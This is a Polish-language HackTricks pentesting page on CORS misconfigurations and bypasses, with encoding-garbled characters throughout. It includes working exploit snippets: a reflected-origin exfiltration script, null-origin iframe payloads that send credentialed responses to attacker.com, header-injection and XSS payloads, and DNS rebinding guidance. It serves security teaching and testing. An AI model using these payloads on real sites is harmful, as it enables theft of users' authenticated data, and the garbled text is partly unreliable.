# CORS - Konfiguracje i Bypassowanie

<details>

<summary><strong>Zacznij od zera i sta si ekspertem AWS z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan na HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Co to jest CORS?

Standard Cross-Origin Resource Sharing (CORS) **umo偶liwia serwerom okrelenie, kto mo偶e uzyska dostp do ich zasob贸w** i **jakie metody 偶da HTTP s dozwolone** z zewntrznych 藕r贸de.

Polityka **tego samego pochodzenia** nakazuje, 偶e **serwer 偶dajcy** zasobu i serwer hostujcy **zas贸b** musz wsp贸dzieli taki sam protok贸 (np. `http://`), nazw domeny (np. `internal-web.com`) i **port** (np. 80). Zgodnie z t polityk, tylko strony internetowe z tej samej domeny i portu maj dostp do zasob贸w.

Zastosowanie polityki tego samego pochodzenia w kontekcie `http://normal-website.com/example/example.html` jest zilustrowane poni偶ej:

| Odwoany URL                            | Dostp dozwolony?                      |
| --------------------------------------- | --------------------------------------- |
| `http://normal-website.com/example/`    | Tak: Identyczny schemat, domena i port |
| `http://normal-website.com/example2/`   | Tak: Identyczny schemat, domena i port |
| `https://normal-website.com/example/`   | Nie: Inny schemat i port               |
| `http://en.normal-website.com/example/` | Nie: Inna domena                       |
| `http://www.normal-website.com/example/`| Nie: Inna domena                       |
| `http://normal-website.com:8080/example/`| Nie: Inny port\*                       |

\*Internet Explorer pomija numer portu przy egzekwowaniu polityki tego samego pochodzenia, co umo偶liwia ten dostp.

### Nag贸wek `Access-Control-Allow-Origin`

Ten nag贸wek mo偶e zezwala na **wiele 藕r贸de**, warto **`null`** lub dzik kart **`*`**. Jednak **偶aden przegldarka nie obsuguje wielu 藕r贸de**, a u偶ycie dzikiej karty `*` podlega **ograniczeniom**. (Dzika karta musi by u偶ywana samodzielnie, a jej u偶ycie w poczeniu z `Access-Control-Allow-Credentials: true` nie jest dozwolone.)

Ten nag贸wek jest **wysyany przez serwer** w odpowiedzi na 偶danie zasobu z innej domeny zainicjowane przez stron internetow, a przegldarka automatycznie dodaje nag贸wek `Origin`.

### Nag贸wek `Access-Control-Allow-Credentials`

Domylnie 偶dania z innych 藕r贸de s wykonywane bez uwierzytelnienia, takiego jak ciasteczka lub nag贸wek Autoryzacji. Jednak serwer z innej domeny mo偶e zezwoli na odczyt odpowiedzi, gdy przesyane s uwierzytelnienia, ustawiajc nag贸wek `Access-Control-Allow-Credentials` na **`true`**.

Jeli ustawione jest na `true`, przegldarka przeka偶e uwierzytelnienia (ciasteczka, nag贸wki autoryzacji lub certyfikaty klienta TLS).
```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
console.log(xhr.responseText);
}
}
xhr.open('GET', 'http://example.com/', true);
xhr.withCredentials = true;
xhr.send(null);
```

```javascript
fetch(url, {
credentials: 'include'
})
```

```javascript
const xhr = new XMLHttpRequest();
xhr.open('POST', 'https://bar.other/resources/post-here/');
xhr.setRequestHeader('X-PINGOTHER', 'pingpong');
xhr.setRequestHeader('Content-Type', 'application/xml');
xhr.onreadystatechange = handler;
xhr.send('<person><name>Arun</name></person>');
```
### 呕danie wstpne CSRF

### Zrozumienie 偶da wstpnych w komunikacji midzy domenami

Podczas inicjowania 偶dania midzy domenami w okrelonych warunkach, takich jak u偶ycie **metody HTTP niestandardowej** (cokolwiek innego ni偶 HEAD, GET, POST), wprowadzenie nowych **nag贸wk贸w**, lub u偶ycie specjalnej wartoci nag贸wka **Content-Type**, mo偶e by wymagane 偶danie wstpne. To wstpne 偶danie, wykorzystujce metod **`OPTIONS`**, su偶y poinformowaniu serwera o intencjach nadchodzcego 偶dania midzy domenami, w tym o metodach HTTP i nag贸wkach, jakie ma zamiar u偶y.

Protok贸 **Cross-Origin Resource Sharing (CORS)** nakazuje t wstpn kontrol, aby okreli wykonalno 偶danej operacji midzy domenami poprzez weryfikacj dozwolonych metod, nag贸wk贸w i zaufania pochodzenia. Aby dokadnie zrozumie, jakie warunki omijaj konieczno 偶dania wstpnego, nale偶y zapozna si z obszernym przewodnikiem udostpnionym przez [**Mozilla Developer Network (MDN)**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests).

Nale偶y zauwa偶y, 偶e **brak 偶dania wstpnego nie znosi koniecznoci posiadania nag贸wk贸w autoryzacyjnych w odpowiedzi**. Bez tych nag贸wk贸w, przegldarka nie jest w stanie przetworzy odpowiedzi z 偶dania midzy domenami.

Rozwa偶 poni偶sz ilustracj 偶dania wstpnego majcego na celu u偶ycie metody `PUT` wraz z niestandardowym nag贸wkiem o nazwie `Special-Request-Header`:
```
OPTIONS /info HTTP/1.1
Host: example2.com
...
Origin: https://example.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Authorization
```
W odpowiedzi serwer mo偶e zwr贸ci nag贸wki wskazujce akceptowane metody, dozwolony pochodzenie oraz inne szczeg贸y polityki CORS, jak pokazano poni偶ej:
```markdown
HTTP/1.1 204 No Content
...
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: PUT, POST, OPTIONS
Access-Control-Allow-Headers: Authorization
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 240
```
* **`Access-Control-Allow-Headers`**: Ten nag贸wek okrela, kt贸re nag贸wki mog by u偶ywane podczas rzeczywistego 偶dania. Jest ustawiany przez serwer, aby wskaza dozwolone nag贸wki w 偶daniach od klienta.
* **`Access-Control-Expose-Headers`**: Poprzez ten nag贸wek serwer informuje klienta, kt贸re nag贸wki mog by ujawnione jako cz odpowiedzi opr贸cz prostych nag贸wk贸w odpowiedzi.
* **`Access-Control-Max-Age`**: Ten nag贸wek wskazuje, jak dugo wyniki 偶dania wstpnego mog by przechowywane w pamici podrcznej. Serwer ustawia maksymalny czas, w sekundach, przez jaki informacje zwr贸cone przez 偶danie wstpne mog by ponownie wykorzystane.
* **`Access-Control-Request-Headers`**: U偶ywany w 偶daniach wstpnych, ten nag贸wek jest ustawiany przez klienta, aby poinformowa serwer, kt贸re nag贸wki HTTP klient chce u偶y w rzeczywistym 偶daniu.
* **`Access-Control-Request-Method`**: Ten nag贸wek, r贸wnie偶 u偶ywany w 偶daniach wstpnych, jest ustawiany przez klienta, aby wskaza, jaka metoda HTTP zostanie u偶yta w rzeczywistym 偶daniu.
* **`Origin`**: Ten nag贸wek jest automatycznie ustawiany przez przegldark i wskazuje pochodzenie 偶dania midzydomenowego. Jest u偶ywany przez serwer do oceny, czy przychodzce 偶danie powinno by zezwolone czy odrzucone na podstawie polityki CORS.

Zauwa偶, 偶e zazwyczaj (w zale偶noci od typu zawartoci i ustawionych nag贸wk贸w) w 偶daniu **GET/POST nie jest wysyane 偶danie wstpne** (偶danie jest wysyane **bezporednio**), ale jeli chcesz uzyska dostp do **nag贸wk贸w/ciaa odpowiedzi**, musi zawiera nag贸wek _Access-Control-Allow-Origin_ pozwalajcy na to.\
**Dlatego CORS nie chroni przed CSRF (ale mo偶e by pomocny).**

### **呕danie wstpne lokalnej sieci**

1. **`Access-Control-Request-Local-Network`**: Ten nag贸wek jest doczany do 偶dania klienta, aby wskaza, 偶e zapytanie jest skierowane do zasobu w lokalnej sieci. Su偶y jako znacznik informujcy serwer, 偶e 偶danie pochodzi z wewntrz lokalnej sieci.
2. **`Access-Control-Allow-Local-Network`**: W odpowiedzi serwery wykorzystuj ten nag贸wek, aby przekaza, 偶e 偶dany zas贸b mo偶e by udostpniany podmiotom spoza lokalnej sieci. Dziaa jak zielone wiato dla udostpniania zasob贸w midzy r贸偶nymi granicami sieci, zapewniajc kontrolowany dostp przy zachowaniu protoko贸w bezpieczestwa.

A **poprawna odpowied藕 zezwalajca na 偶danie lokalnej sieci** musi r贸wnie偶 zawiera w odpowiedzi nag贸wek `Access-Controls-Allow-Local_network: true`:
```
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: GET
Access-Control-Allow-Credentials: true
Access-Control-Allow-Local-Network: true
Content-Length: 0
...
```
{% hint style="warning" %}
Nale偶y zauwa偶y, 偶e adres IP **0.0.0.0** w systemie Linux dziaa w celu **obejcia** tych wymaga dotyczcych dostpu do localhost, poniewa偶 ten adres IP nie jest uwa偶any za "lokalny".

Mo偶liwe jest r贸wnie偶 **obejcie wymaga dotyczcych sieci lokalnej**, jeli u偶yjesz **publicznego adresu IP lokalnego punktu kocowego** (takiego jak publiczny adres IP routera). Poniewa偶 w kilku przypadkach, nawet jeli **publiczny adres IP** jest u偶ywany, jeli jest to **z sieci lokalnej**, dostp zostanie udzielony.
{% endhint %}

## Wykorzystywane bdy konfiguracyjne

Zauwa偶ono, 偶e ustawienie `Access-Control-Allow-Credentials` na **`true`** jest warunkiem koniecznym dla wikszoci **rzeczywistych atak贸w**. To ustawienie pozwala przegldarce na wysyanie powiadcze i odczytywanie odpowiedzi, zwikszajc skuteczno ataku. Bez tego korzy z zmuszania przegldarki do wysania 偶dania zamiast samodzielnie tego robi maleje, poniewa偶 wykorzystanie plik贸w cookie u偶ytkownika staje si niemo偶liwe.

### Wyjtek: Wykorzystanie Lokalizacji Sieciowej jako Formy Autoryzacji

Istnieje wyjtek, gdzie lokalizacja sieciowa ofiary dziaa jako forma autoryzacji. Pozwala to na u偶ycie przegldarki ofiary jako proxy, omijajc autoryzacj opart na adresie IP w celu uzyskania dostpu do aplikacji w sieci wewntrznej. Ta metoda ma podobne skutki jak przekierowanie DNS, ale jest atwiejsza do wykorzystania.

### Odzwierciedlenie `Origin` w `Access-Control-Allow-Origin`

Teoretycznie mao prawdopodobny jest scenariusz, w kt贸rym warto nag贸wka `Origin` jest odzwierciedlana w `Access-Control-Allow-Origin` z powodu ogranicze dotyczcych czenia tych nag贸wk贸w. Jednak programici starajcy si wczy CORS dla wielu adres贸w URL mog dynamicznie generowa nag贸wek `Access-Control-Allow-Origin`, kopiujc warto nag贸wka `Origin`. Ten podejcie mo偶e wprowadzi podatnoci, zwaszcza gdy atakujcy u偶ywa domeny o nazwie zaprojektowanej tak, aby wydawaa si wiarygodna, wprowadzajc w bd logik walidacji.
```html
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example.com/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='/log?key='+this.responseText;
};
</script>
```
### Wykorzystywanie pochodzenia `null`

Pochodzenie `null`, okrelone dla sytuacji takich jak przekierowania lub lokalne pliki HTML, zajmuje wyjtkow pozycj. Niekt贸re aplikacje dodaj to pochodzenie do biaej listy w celu uatwienia lokalnego rozwoju, co nieumylnie pozwala dowolnej witrynie na udawanie pochodzenia `null` za pomoc osadzonego iframu, co umo偶liwia ominicie ogranicze CORS.
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://attacker.com//log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://attacker.com//log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```
### Techniki bypassowania wyra偶e regularnych

Podczas napotkania biaej listy domen wa偶ne jest przetestowanie mo偶liwoci bypassowania, takich jak doczenie domeny atakujcego do domeny z biaej listy lub wykorzystanie podatnoci na przejcie subdomeny. Dodatkowo, wyra偶enia regularne u偶ywane do walidacji domen mog przeoczy niuanse w konwencjach nazewnictwa domen, co stwarza dodatkowe mo偶liwoci bypassowania.

### Zaawansowane techniki bypassowania wyra偶e regularnych

Wzorce Regex zazwyczaj koncentruj si na znakach alfanumerycznych, kropce (.), i mylniku (-), pomijajc inne mo偶liwoci. Na przykad, nazwa domeny stworzona tak, aby zawiera znaki interpretowane inaczej przez przegldarki i wzorce Regex, mo偶e omin kontrole bezpieczestwa. Obsuga znak贸w podkrelenia w subdomenach przez Safari, Chrome i Firefox ilustruje, jak takie rozbie偶noci mog by wykorzystane do obejcia logiki walidacji domeny.

**Aby uzyska wicej informacji na temat tego sprawdzenia bypass:** [**https://www.corben.io/advanced-cors-techniques/**](https://www.corben.io/advanced-cors-techniques/) **i** [**https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397**](https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397)

![https://miro.medium.com/v2/resize:fit:720/format:webp/1\*rolEK39-DDxeBgSq6KLKAA.png](<../.gitbook/assets/image (281).png>)

### Od XSS wewntrz subdomeny

Programici czsto implementuj mechanizmy obronne, aby chroni si przed eksploatacj CORS poprzez uwzgldnianie na biaej licie domen, kt贸re maj zezwolenie na 偶danie informacji. Pomimo tych rodk贸w ostro偶noci, bezpieczestwo systemu nie jest niezawodne. Obecno nawet jednej podatnej subdomeny wr贸d domen z biaej listy mo偶e otworzy drzwi do eksploatacji CORS poprzez inne podatnoci, takie jak XSS (Cross-Site Scripting).

Dla przykadu, rozwa偶my scenariusz, w kt贸rym domena `requester.com` jest na biaej licie do dostpu do zasob贸w z innej domeny, `provider.com`. Konfiguracja po stronie serwera mogaby wyglda mniej wicej tak:
```javascript
if ($_SERVER['HTTP_HOST'] == '*.requester.com') {
// Access data
} else {
// Unauthorized access
}
```
W tej konfiguracji wszystkie subdomeny `requester.com` maj zezwolenie na dostp. Jednak偶e, jeli subdomena, na przykad `sub.requester.com`, zostanie skompromitowana poprzez podatno XSS, atakujcy mo偶e wykorzysta t sabo. Na przykad atakujcy majcy dostp do `sub.requester.com` m贸gby wykorzysta podatno XSS do ominicia zasad CORS i zoliwie uzyska dostp do zasob贸w na `provider.com`.

### **Zatrucie pamici podrcznej po stronie serwera**

[**Z tej publikacji**](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)

Istnieje mo偶liwo wykorzystania zatrucia pamici podrcznej po stronie serwera poprzez wstrzyknicie nag贸wka HTTP, co mo偶e spowodowa wywoanie przechowywanej podatnoci na Cross-Site Scripting (XSS). Ten scenariusz ma miejsce, gdy aplikacja nie oczyszcza nag贸wka `Origin` z nielegalnych znak贸w, tworzc podatno szczeg贸lnie dla u偶ytkownik贸w Internet Explorer i Edge. Te przegldarki traktuj (0x0d) jako legalny terminator nag贸wka HTTP, co prowadzi do podatnoci na wstrzyknicie nag贸wka HTTP.

Rozwa偶my poni偶sze 偶danie, w kt贸rym manipulowany jest nag贸wek `Origin`:
```
GET / HTTP/1.1
Origin: z[0x0d]Content-Type: text/html; charset=UTF-7
```
Internet Explorer i Edge interpretuj odpowied藕 jako:
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: z
Content-Type: text/html; charset=UTF-7
```
Podczas bezporedniego wykorzystywania tej podatnoci poprzez wysanie bdnego nag贸wka przez przegldark internetow nie jest wykonalne, mo偶na rcznie generowa spreparowane 偶dania za pomoc narzdzi takich jak Burp Suite. Ta metoda mo偶e spowodowa zapisanie odpowiedzi w pamici podrcznej po stronie serwera i przypadkowe udostpnienie jej innym. Spreparowany adunek ma na celu zmian zestawu znak贸w strony na UTF-7, kodowanie znak贸w czsto kojarzone z podatnociami XSS ze wzgldu na zdolno kodowania znak贸w w taki spos贸b, 偶e mog by wykonane jako skrypt w okrelonych kontekstach.

Aby uzyska wicej informacji na temat podatnoci stored XSS, zobacz [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/stored).

**Uwaga**: Wykorzystanie podatnoci wstrzykiwania nag贸wk贸w HTTP, zwaszcza poprzez zatrucie pamici podrcznej po stronie serwera, podkrela kluczowe znaczenie walidacji i oczyszczania wszystkich dostarczanych przez u偶ytkownika danych, w tym nag贸wk贸w HTTP. Zawsze stosuj solidny model bezpieczestwa, kt贸ry obejmuje walidacj danych, aby zapobiec takim podatnociom.

### **Zatrucie pamici podrcznej po stronie klienta**

[Z tej publikacji](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)

W tym scenariuszu zaobserwowano wystpienie strony internetowej odzwierciedlajcej zawarto niestandardowego nag贸wka HTTP bez odpowiedniego kodowania. Konkretnie, strona internetowa odzwierciedla zawarto zawart w nag贸wku `X-User-id`, kt贸ry mo偶e zawiera zoliwy JavaScript, jak pokazano na przykadzie, gdzie nag贸wek zawiera tag obrazu SVG zaprojektowany do wykonania kodu JavaScript podczas adowania.

Polityki Cross-Origin Resource Sharing (CORS) pozwalaj na wysyanie niestandardowych nag贸wk贸w. Jednak偶e, bez bezporedniego renderowania odpowiedzi przez przegldark ze wzgldu na ograniczenia CORS, u偶yteczno takiej wstrzyknicia mo偶e wydawa si ograniczona. Krytyczny punkt pojawia si przy rozwa偶eniu zachowania pamici podrcznej przegldarki. Jeli nag贸wek `Vary: Origin` nie jest okrelony, mo偶liwe staje si zapisanie zoliwej odpowiedzi w pamici podrcznej przegldarki. W rezultacie ta zapisana odpowied藕 mo偶e by renderowana bezporednio podczas nawigacji do adresu URL, omijajc konieczno bezporedniego renderowania podczas pocztkowego 偶dania. Ten mechanizm zwiksza niezawodno ataku poprzez wykorzystanie pamici podrcznej po stronie klienta.

Aby zilustrowa ten atak, dostarczony jest przykad skryptu JavaScript, zaprojektowany do wykonania w rodowisku strony internetowej, na przykad za pomoc JSFiddle. Ten skrypt wykonuje prost akcj: wysya 偶danie pod wskazany adres URL z niestandardowym nag贸wkiem zawierajcym zoliwy JavaScript. Po pomylnym zakoczeniu 偶dania, pr贸buje nawigowa do docelowego adresu URL, potencjalnie wywoujc wykonanie wstrzyknitego skryptu, jeli odpowied藕 zostaa zapisana w pamici podrcznej bez waciwego obsugiwania nag贸wka `Vary: Origin`.

Poni偶ej znajduje si zwize podsumowanie u偶ytego JavaScriptu do wykonania tego ataku:
```html
<script>
function gotcha() { location=url }
var req = new XMLHttpRequest();
url = 'https://example.com/'; // Note: Be cautious of mixed content blocking for HTTP sites
req.onload = gotcha;
req.open('get', url, true);
req.setRequestHeader("X-Custom-Header", "<svg/onload=alert(1)>");
req.send();
</script>
```
## Bypass

### XSSI (Cross-Site Script Inclusion) / JSONP

XSSI, znane r贸wnie偶 jako Cross-Site Script Inclusion, to rodzaj podatnoci, kt贸ra wykorzystuje fakt, 偶e Polityka Jednego 殴r贸da (SOP) nie ma zastosowania podczas doczania zasob贸w za pomoc tagu skryptu. Dzieje si tak dlatego, 偶e skrypty musz by w stanie by doczane z r贸偶nych domen. Ta podatno pozwala atakujcemu uzyska dostp i odczyta dowolne treci doczone za pomoc tagu skryptu.

Ta podatno staje si szczeg贸lnie istotna w przypadku dynamicznego JavaScriptu lub JSONP (JSON z Paddingiem), zwaszcza gdy u偶ywane s informacje o autoryzacji zwizane z uprawnieniami. Podczas 偶dania zasobu z innej hosta, ciasteczka s doczane, co sprawia, 偶e s one dostpne dla atakujcego.

Aby lepiej zrozumie i zagodzi t podatno, mo偶na skorzysta z wtyczki BurpSuite dostpnej pod adresem [https://github.com/kapytein/jsonp](https://github.com/kapytein/jsonp). Ta wtyczka mo偶e pom贸c zidentyfikowa i rozwiza potencjalne podatnoci XSSI w aplikacjach internetowych.

[**Dowiedz si wicej o r贸偶nych typach XSSI i jak je wykorzysta tutaj.**](xssi-cross-site-script-inclusion.md)

Spr贸buj doda **`callback`** **parametr** w 偶daniu. By mo偶e strona zostaa przygotowana do wysyania danych jako JSONP. W takim przypadku strona zwr贸ci dane z `Content-Type: application/javascript`, co umo偶liwi obejcie polityki CORS.

![](<../.gitbook/assets/image (853).png>)

### atwe (bezu偶yteczne?) obejcie

Jednym ze sposob贸w obejcia ograniczenia `Access-Control-Allow-Origin` jest poproszenie aplikacji internetowej o wykonanie 偶dania w twoim imieniu i odesanie odpowiedzi. Jednak偶e, w tym scenariuszu, dane uwierzytelniajce ostatecznej ofiary nie zostan wysane, poniewa偶 偶danie jest wykonywane do innej domeny.

1. [**CORS-escape**](https://github.com/shalvah/cors-escape): Narzdzie to dostarcza serwer proxy, kt贸ry przekazuje twoje 偶danie wraz z nag贸wkami, jednoczenie podszywajc si pod nag贸wek Origin, aby pasowa do 偶danej domeny. W ten spos贸b efektywnie omija si polityk CORS. Oto przykadowe u偶ycie z u偶yciem XMLHttpRequest:
2. [**simple-cors-escape**](https://github.com/shalvah/simple-cors-escape): To narzdzie oferuje alternatywne podejcie do przekazywania 偶dania. Zamiast przekazywa twoje 偶danie w oryginalnej postaci, serwer wykonuje wasne 偶danie z okrelonymi parametrami.

### Ominicie za pomoc Iframe + Popup

Mo偶esz **obej sprawdzanie CORS**, takie jak `e.origin === window.origin`, **tworzc iframe** i **otwierajc z niego nowe okno**. Wicej informacji na nastpnej stronie:

{% content-ref url="xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### Przeczanie DNS za pomoc TTL

Przeczanie DNS za pomoc TTL to technika u偶ywana do obejcia pewnych rodk贸w bezpieczestwa poprzez manipulowanie rekordami DNS. Oto jak to dziaa:

1. Atakujcy tworzy stron internetow i sprawia, 偶e ofiara j odwiedza.
2. Nastpnie atakujcy zmienia DNS (IP) swojej wasnej domeny, aby wskazywa na stron internetow ofiary.
3. Przegldarka ofiary buforuje odpowied藕 DNS, kt贸ra mo偶e zawiera warto TTL (Time to Live) okrelajc, jak dugo rekord DNS powinien by uwa偶any za wa偶ny.
4. Po upywie TTL przegldarka ofiary wykonuje nowe 偶danie DNS, pozwalajc atakujcemu na wykonanie kodu JavaScript na stronie ofiary.
5. Utrzymujc kontrol nad IP ofiary, atakujcy mo偶e zbiera informacje od ofiary bez wysyania jakichkolwiek ciasteczek do serwera ofiary.

Warto zauwa偶y, 偶e przegldarki maj mechanizmy buforowania, kt贸re mog zapobiec natychmiastowemu wykorzystaniu tej techniki, nawet przy niskich wartociach TTL.

Przeczanie DNS mo偶e by przydatne do obejcia jawnego sprawdzania IP przeprowadzanego przez ofiar lub w scenariuszach, w kt贸rych u偶ytkownik lub bot pozostaje na tej samej stronie przez dugi czas, co pozwala buforowi wygasn.

Jeli potrzebujesz szybkiego sposobu na wykorzystanie przeczania DNS, mo偶esz skorzysta z usug takich jak [https://lock.cmpxchg8b.com/rebinder.html](https://lock.cmpxchg8b.com/rebinder.html).

Aby uruchomi wasny serwer przeczania DNS, mo偶na skorzysta z narzdzi takich jak **DNSrebinder** ([https://github.com/mogwailabs/DNSrebinder](https://github.com/mogwailabs/DNSrebinder)). Wymaga to wystawienia lokalnego portu 53/udp, utworzenia rekordu A wskazujcego na niego (np. ns.example.com) oraz utworzenia rekordu NS wskazujcego na wczeniej utworzon poddomen A (np. ns.example.com). Ka偶da poddomena poddomeny ns.example.com bdzie w贸wczas rozwizywana przez tw贸j host.

Mo偶esz tak偶e skorzysta z publicznie dziaajcego serwera pod adresem [http://rebind.it/singularity.html](http://rebind.it/singularity.html) dla dalszego zrozumienia i eksperymentowania.

### Przeczanie DNS za pomoc **Przepywu pamici podrcznej DNS**

Przeczanie DNS za pomoc przepywu pamici podrcznej DNS to inna technika u偶ywana do obejcia mechanizmu buforowania przegldarek i wymuszenia drugiego 偶dania DNS. Oto jak to dziaa:

1. Pocztkowo, gdy ofiara wysya 偶danie DNS, otrzymuje odpowied藕 z adresem IP atakujcego.
2. Aby omin obron buforowania, atakujcy wykorzystuje pracownika usugi. Pracownik usugi zalewa pami podrczn DNS, co efektywnie usuwa zbuforowan nazw serwera atakujcego.
3. Gdy przegldarka ofiary wysya drugie 偶danie DNS, otrzymuje teraz odpowied藕 z adresem IP 127.0.0.1, kt贸ry zazwyczaj odnosi si do lokalnego hosta.

Poprzez zalewanie pamici podrcznej DNS pracownikiem usugi, atakujcy mo偶e manipulowa procesem rozwizywania DNS i zmusi przegldark ofiary do wysania drugiego 偶dania, tym razem rozwizujc si na po偶dany adres IP atakujcego.

### Przeczanie DNS za pomoc **Pamici podrcznej**

Innym sposobem na obejcie obrony buforowania jest wykorzystanie wielu adres贸w IP dla tej samej poddomeny w dostawcy DNS. Oto jak to dziaa:

1. Atakujcy ustawia dwa rekordy A (lub pojedynczy rekord A z dwoma IP) dla tej samej poddomeny w dostawcy DNS.
2. Gdy przegldarka sprawdza te rekordy, otrzymuje oba adresy IP.
3. Jeli przegldarka zdecyduje si najpierw u偶y adresu IP atakujcego, atakujcy mo偶e dostarczy adunek, kt贸ry wykonuje 偶dania HTTP do tej samej domeny.
4. Jednak gdy atakujcy uzyska adres IP ofiary, przestaje odpowiada przegldarce ofiary.
5. Przegldarka ofiary, po zauwa偶eniu, 偶e domena jest niedostpna, przechodzi do u偶ycia drugiego podanego adresu IP.
6. Poprzez dostp do drugiego adresu IP, przegldarka omija Polityk Jednego 殴r贸da (SOP), co pozwala atakujcemu wykorzysta to i uzyska i wyciekn informacje.

Ta technika wykorzystuje zachowanie przegldarek, gdy dostarczane s im multiple adresy IP dla domeny. Poprzez strategiczne kontrolowanie odpowiedzi i manipulowanie wyborem adresu IP przez przegldark, atakujcy mo偶e wykorzysta SOP i uzyska dostp do informacji od ofiary.

{% hint style="warning" %}
Zauwa偶, 偶e aby uzyska dostp do localhost, powiniene spr贸bowa przypisa ponownie **127.0.0.1** w systemie Windows i **0.0.0.0** w systemie Linux.\
Dostawcy takie jak godaddy lub cloudflare nie pozwoliy mi na u偶ycie adresu IP 0.0.0.0, ale AWS route53 pozwolio mi utworzy jeden rekord A z 2 adresami IP, z kt贸rych jeden to "0.0.0.0"

<img src="../.gitbook/assets/image (137).png" alt="" data-size="original">
{% endhint %}

Aby uzyska wicej informacji, mo偶esz sprawdzi [https://unit42.paloaltonetworks.com/dns-rebinding/](https://unit42.paloaltonetworks.com/dns-rebinding/)
### Inne powszechne metody obchodzenia

* Jeli **wewntrzne adresy IP nie s dozwolone**, mog **zapomnie o zakazaniu 0.0.0.0** (dziaa w systemach Linux i Mac)
* Jeli **wewntrzne adresy IP nie s dozwolone**, odpowiedz **CNAME** na **localhost** (dziaa w systemach Linux i Mac)
* Jeli **wewntrzne adresy IP nie s dozwolone** jako odpowiedzi DNS, mo偶na odpowiedzie **CNAME na wewntrzne usugi** takie jak www.corporate.internal.

### Uzbrojone ataki DNS Rebidding

Wicej informacji na temat poprzednich technik obchodzenia i jak korzysta z poni偶szego narzdzia mo偶na znale藕 w prezentacji [Gerald Doussot - State of DNS Rebinding Attacks & Singularity of Origin - Konferencja DEF CON 27](https://www.youtube.com/watch?v=y9-0lICNjOQ).

[**`Singularity of Origin`**](https://github.com/nccgroup/singularity) to narzdzie do przeprowadzania atak贸w [DNS rebinding](https://en.wikipedia.org/wiki/DNS\_rebinding). Zawiera niezbdne komponenty do przypisania adresu IP serwera atakujcego nazwie DNS do adresu IP maszyny docelowej i serwowania adunk贸w ataku w celu wykorzystania podatnego oprogramowania na maszynie docelowej.

### Rzeczywista ochrona przed atakami DNS Rebinding

* U偶ywaj TLS w wewntrznych usugach
* Wymagaj uwierzytelnienia do dostpu do danych
* Sprawdzaj nag贸wek Host
* [https://wicg.github.io/private-network-access/](https://wicg.github.io/private-network-access/): Propozycja zawsze wysyania 偶dania pre-flight, gdy serwery publiczne chc uzyska dostp do serwer贸w wewntrznych

## **Narzdzia**

**Testuj mo偶liwe bdy konfiguracji w politykach CORS**

* [https://portswigger.net/bappstore/420a28400bad4c9d85052f8d66d3bbd8](https://portswigger.net/bappstore/420a28400bad4c9d85052f8d66d3bbd8)
* [https://github.com/chenjj/CORScanner](https://github.com/chenjj/CORScanner)
* [https://github.com/lc/theftfuzzer](https://github.com/lc/theftfuzzer)
* [https://github.com/s0md3v/Corsy](https://github.com/s0md3v/Corsy)
* [https://github.com/Shivangx01b/CorsMe](https://github.com/Shivangx01b/CorsMe)
* [https://github.com/omranisecurity/CorsOne](https://github.com/omranisecurity/CorsOne)

## Odnoniki

* [https://portswigger.net/web-security/cors](https://portswigger.net/web-security/cors)
* [https://portswigger.net/web-security/cors/access-control-allow-origin](https://portswigger.net/web-security/cors/access-control-allow-origin)
* [https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#CORS)
* [https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)
* [https://www.codecademy.com/articles/what-is-cors](https://www.codecademy.com/articles/what-is-cors)
